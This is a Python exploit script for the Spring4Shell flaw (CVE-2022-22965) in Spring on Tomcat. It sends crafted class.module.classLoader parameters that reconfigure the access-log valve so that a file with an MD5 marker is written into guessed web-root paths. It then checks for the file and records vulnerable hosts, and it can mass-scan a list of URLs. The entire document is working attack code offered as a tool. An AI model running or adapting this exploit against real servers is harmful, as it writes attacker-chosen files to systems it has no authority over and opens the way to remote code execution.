import requests
import time
import urllib3
urllib3.disable_warnings()
import argparse
import urllib.parse
import threading
import hashlib
import random

check_md5 = ""
filename = ""

def detail():
    tips = '''
 ______  _     _   ______ -2022-22965
| |     | |   | | | |                
| |     \ \   / / | |----            
|_|____  \_\_/_/  |_|____            
                                     by: iak3ec
                                     https://github.com/nu0l
    '''
    print(tips)


def exp(url,path,filename,mini):
    get_md5()
    headers = {
        "User-Agent" : "Mozilla/5.5 (Macintosh; AMD Mac OS X 15.15; rv:98.2) Gecko/2020007 Chrome/99.9",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern={code}&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory={path}&class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat={mini}".format(code=check_md5,path=path,filename=filename,mini=mini)
   
#    proxies = {
#    'http' : 'http://127.0.0.1:8080',
#    'https' : 'https://127.0.0.1:8080'
#   }

    try:
        req = requests.post(url,headers=headers,data=data,verify=False,timeout=5,)
        print("[:]s-l-e-e-p-1-0>")
        time.sleep(10)
        url1 = urllib.parse.urljoin(url,"{filename}{mini}.txt").format(filename=filename,mini=mini)
        res = requests.get(url1,verify=False,timeout=10,)
        if res.status_code == 200 and check_md5 in res.text:
            print ("\033[31m[high] \033[0m"+str(url))
            print("Verify: " +url1)
            print("WebPath: " +path+ "[:]\n")
            with open('result.txt','a+') as result:
                result.write(url+"\n")
                result.write(path+"\n\n")
        else:
            print("\033[32m[low] \033[0m"+str(url)+"\n")
    except Exception as e:
        print(e)
        pass


def get_md5():
    RandomData = random.randint(1,99999)
    global check_md5
    check_md5 = hashlib.md5(str(RandomData).encode(encoding="UTF-8")).hexdigest()

'''
def threadings():
    t = threading.Thread(target=main)
    t.start()
# RCE Bug
'''

def main():
    parser = argparse.ArgumentParser(description="Spring-Code-RCE")
    parser.add_argument('-u',help="target url",required=False)
    parser.add_argument('-f',help="url file",required=False)
    args = parser.parse_args()
    # add path
    path = ['/app/tomcat/webapps/ROOT','/usr/local/tomcat/webapps/ROOT','c:\\\\tomcat\\\\webapps','./webapps/ROOT','root']
    if args.u:
        for web_path in path:
            get_md5()
            filename = check_md5
            mini = random.randrange(10,99)
            exp(args.u,web_path,filename,mini)
    if args.f:
        with open (args.f) as file:
            for i in file.readlines():
                i = i.strip()
                for web_path in path:
                    get_md5()
                    filename = check_md5
                    mini = random.randrange(10,99)
                    exp(i,web_path,filename,mini)


if __name__ == '__main__':
    detail()
    main()